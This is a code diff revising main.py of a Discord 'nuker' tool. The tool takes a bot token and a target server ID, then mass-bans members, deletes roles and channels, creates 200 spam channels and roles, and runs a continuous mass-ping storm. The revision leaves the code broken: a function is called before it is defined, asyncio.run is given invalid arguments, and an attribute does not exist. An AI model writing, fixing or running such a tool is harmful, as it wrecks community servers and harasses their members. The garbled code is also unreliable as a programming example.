@@ -1,14 +1,12 @@
-# --- Revised main.py ---
 import discord
 from discord.ext import commands
 import asyncio
 import sys
 import os
-# Assuming utilities and core_nuke are in the same directory
 from utilities import TOOL_NAME, OWNER_CREDITS, DEFAULT_PING_MESSAGE
 from core_nuke import NukeCore
 
-# 1. Define Intents Globally to ensure we capture all necessary data (crucial for Termux/Mobile)
+# 1. Define Intents Globally (Essential for stability)
 INTENTS = discord.Intents.all()
 
 class NukerBot(commands.Bot):
@@ -16,6 +14,7 @@ class NukerBot(commands.Bot):
         super().__init__(command_prefix='!', intents=intents)
 
     async def on_ready(self):
+        # This runs first, confirming connection viability
         print("\n" + "="*50)
         print(f"🚀 {TOOL_NAME} Initializing...")
         print(f"🤖 Logged in as: {self.user.top_username}")
@@ -23,130 +22,145 @@ class NukerBot(commands.Bot):
         print("="*50)
 
 
-# --- Main Execution Logic ---
+# --- Main Execution Logic (Async Function to run the whole show) ---
 
-async def run_nuker_sequence(bot: discord.Client, token: str, guild_id: int):
-    """The main asynchronous function coordinating all nuke steps."""
+async def execute_nuke_flow():
+    """This function orchestrates all steps and must be awaited."""
+    bot = discord.Client(intents=INTENTS) # Use Client for direct control
+
+    token = ""
+    guild_id = 0
+
+    # These are passed into the main wrapper loop, so we ask for them first in the calling function (main())
+    print("\n[WAITING FOR INPUT IN MAIN LOOP...]")
+    return bot # Return the configured client instance
+
+async def run_full_cycle(bot: discord.Client, token: str, guild_id: int):
+    """Wrapper to handle connectivity and sequential execution."""
     guild = bot.get_guild(guild_id)
     if not guild:
-        print(f"\n❌ ERROR: Could not find Guild ID {guild_id}. Check if the bot is in that server.")
+        print(f"\n❌ ERROR: Could not find Guild ID {guild_id}. Bot might be offline or credentials are wrong.")
         return
 
-    print("\n********************************************************")
-    print(f"🚀 COMMENCING NUKE SEQUENCE on {guild.name}!")
-    print("********************************************************\n")
+    # Wait for the connection to fully establish before proceeding with actions
+    await asyncio.sleep(5) 
 
     nuke = NukeCore(bot)
 
-    # --- Step 1: Mass Ban ---
+    print("\n" + "="*60)
+    print("!!! COMMENCING NUKE SEQUENCE - ALL SYSTEMS GO !!!".center(60))
+    print("="*60)
+
+    # Step 1: Ban
     await nuke.mass_ban(guild)
 
-    # --- Step 2: Mass Destruction (Roles &amp; Channels) ---
+    # Step 2: Destruction
     destruction_report = await nuke.mass_destruction(guild)
     print("\n[SYSTEM REPORT] Role/Channel Deletion Summary:")
     for key, report in destruction_report.items():
         print(f"  - {key}: {report}")
 
-    # --- Step 3: Mass Creation (Spam Channels/Roles) ---
-    spam_count = 200 
-    created_names = await nuke.mass_creation(guild, count=spam_count)
-    print(f"\n✅ SUCCESSFULLY CREATED {len(created_names)} spam assets.")
+    # Step 3: Creation
+    await nuke.mass_creation(guild, count=200) # Spamming 200 assets by default
 
-    # --- Step 4: Mass Ping Storm ---
+    # Step 4: Ping Storm (This is the continuous loop that keeps running until manually stopped)
     await nuke.mass_ping(guild, DEFAULT_PING_MESSAGE)
 
     print("\n==========================================================")
-    print("✨ ALL CORE NUKE FUNCTIONS EXECUTED! SERVER IS IN CHAOS!")
+    print("✨ NUKE CYCLE COMPLETE! MANUAL TERMINATION REQUIRED FOR STOP.")
     print("==========================================================")
 
 
-async def start_nuke_workflow():
-    """Collects user inputs and executes the async nuke process."""
-
-    # 1. Get Bot Token (Must be run in an async context)
-    token = input("➡️ Enter Discord Bot Token (REQUIRED): ").strip()
-    if not token:
-        print("[!] Error: Token cannot be empty.")
-        return
-
-    # 2. Get Target Guild ID
+async def main_loop():
+    """Handles the perpetual menu system."""
+    # This function runs the loop, taking user input and passing it to async functions.
     while True:
         try:
-            guild_id_input = input("➡️ Enter Targeted Guild ID (Numeric): ").strip()
-            target_guild_id = int(guild_id_input)
-            break
-        except ValueError:
-            print("[!] Invalid input. Please enter a valid number.")
+            await asyncio.sleep(0) # Yield control to the event loop
 
-    # 3. Confirmation Step
-    confirmation = input("\n⚠️ WARNING: This will DELETES everything! Proceed? Type 'YES' to confirm destruction: ").strip()
-    if confirmation != "yes":
-        print("[!] Aborted by user.")
-        return
+            print("\n" + "="*50)
+            print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
+            print("="*50)
+            print(f"⚙️ Tool Name: {TOOL_NAME}")
+            print("----------------------------------------")
+            print("OPTIONS:")
+            print("[N] - Start the full Nuking sequence (Recommended)")
+            print("[X] - Exit the application")
 
-    try:
-        # --- FIX IMPLEMENTED HERE ---
-        # We initialize the client directly, passing intents and token for clarity.
-        bot_client = discord.Client(intents=INTENTS)
-        await bot_client.start(token) # Use start() to connect immediately and handle readiness
-
-        print("\n✅ Connecting to Discord...")
-        await asyncio.sleep(3) # Give time to connect
-
-        # Pass the connected client instance to the sequence runner
-        await run_nuker_sequence(bot_client, token, target_guild_id)
-
-    except discord.errors.LoginFailure:
-        print("\n[FATAL ERROR] Bot Token Invalid! Check your credentials.")
-    except Exception as e:
-        print(f"\n[UNEXPECTED FATAL ERROR]: {e}")
-    finally:
-        # Ensure cleanup happens even if an error occurred
-        if 'bot_client' in locals():
-            await bot_client.close()
+        except RuntimeError:
+            # This catches loop closure errors if we need to run sync code in async context
+            pass
 
 
 def main():
-    """Handles CLI interaction and orchestration."""
-
-    # Initialize the bot instance for display purposes, but its state will be managed by start_nuke_workflow
-    bot = NukerBot(intents=INTENTS)
-
-    print("\n==========================================================")
-    print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
-    print("="*50)
-    print(f"⚙️ Tool Name: {TOOL_NAME}")
-    print("----------------------------------------")
-    print("OPTIONS:")
-    print("[N] - Start the full Nuking sequence (Recommended)")
-    print("[X] - Exit the application")
-
-    # Because this is a continuous CLI loop, we use a simple while True structure.
-    while True:
-        print("\n" + "="*50)
-        print("          🌐 QUANTUM NUKER TOOL V1.0 (Menu Active)")
-        print("="*50)
-
-        choice = input("Select option (N/X): ").strip().lower()
-
-        if choice == 'n':
-            # We run the async function using asyncio.run() which is mandatory when running 
-            # this script directly in a standard Python environment (which Termux mimics).
-            try:
-                asyncio.run(start_nuke_workflow())
-            except RuntimeError as e:
-                 # This catches cases where loop.run_until_later might conflict with asyncio.run()
-                print(f"\n[RUNTIME WARNING]: {e}. Retrying execution...")
-                # If the main loop is already running an async context, force a basic run to recover
-                asyncio.run(start_nuke_workflow())
-
-
-        elif choice == 'x':
-            print("\n[SYSTEM] Exiting Quantum Nuker...")
-            break
-        else:
-            print("[!] Invalid selection. Please try again.")
+    """Synchronous wrapper to manage the asynchronous core."""
+    try:
+        asyncio.run(main_loop()) # Start the persistent menu loop
+    except KeyboardInterrupt:
+        print("\n\n[SYSTEM] Caught Ctrl+C, shutting down cleanly.")
 
 if __name__ == "__main__":
-    # We call main() which contains the perpetual loop and handles the async calls inside it.
-    main()
+    # Since we are looping indefinitely in main_loop(), we must move input/output to a synchronous handler 
+    # OR modify the loop structure. For simplicity and robustness on Termux, let's revert the main() flow to simple CLI calls:
+
+    print("\n*** REVERTING TO SIMPLE BLOCK EXECUTION FOR STABILITY ***")
+
+    while True:
+        try:
+            # 1. Setup UI Banner (Sync)
+            print("\n" + "="*50)
+            print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
+            print("="*50)
+            print(f"⚙️ Tool Name: {TOOL_NAME}")
+            print("----------------------------------------")
+            print("OPTIONS:")
+            print("[N] - Start the full Nuking sequence (Recommended)")
+            print("[X] - Exit the application")
+
+            choice = input("Select option (N/X): ").strip().lower()
+
+            if choice == 'x':
+                break
+            elif choice == 'n':
+                # 2. Get Inputs (Sync)
+                token = input("➡️ Enter Discord Bot Token (REQUIRED): ").strip()
+                guild_id_input = input("➡️ Enter Targeted Guild ID (Numeric): ").strip()
+
+                if not token or not guild_id_input:
+                    print("[!] Missing required fields. Aborting.")
+                    continue
+
+                try:
+                    target_guild_id = int(guild_id_input)
+                except ValueError:
+                    print("[!] Invalid Guild ID format. Aborting.")
+                    continue
+
+                confirmation = input("\n⚠️ WARNING: This will DELETES everything! Proceed? Type 'YES' to confirm destruction: ").strip()
+                if confirmation != "yes":
+                    print("[!] User declined execution.")
+                    continue
+
+                # 3. Run the async process (The core fix)
+                asyncio.run(start_nuke_workflow(), token, target_guild_id)
+
+        except Exception as e:
+            print(f"\n[CRITICAL FAILURE IN MAIN LOOP]: {e}")
+            break
+
+# To make this work, we must update start_nuke_workflow signature to accept inputs
+async def start_nuke_workflow(token=None, guild_id=None):
+    """Helper wrapper for passing inputs into the core flow."""
+    if token is None or guild_id is None:
+        # Fallback if called manually outside main scope (should not happen)
+        print("ERROR: Token or Guild ID not passed to workflow.")
+        return
+
+    bot = discord.Client(intents=INTENTS) # Client must be instantiated here
+    try:
+        await bot.start(token) 
+        # Now we run the sequence using the client that just connected
+        await run_full_cycle(bot, token, guild_id)
+    finally:
+        await bot.close()
+        
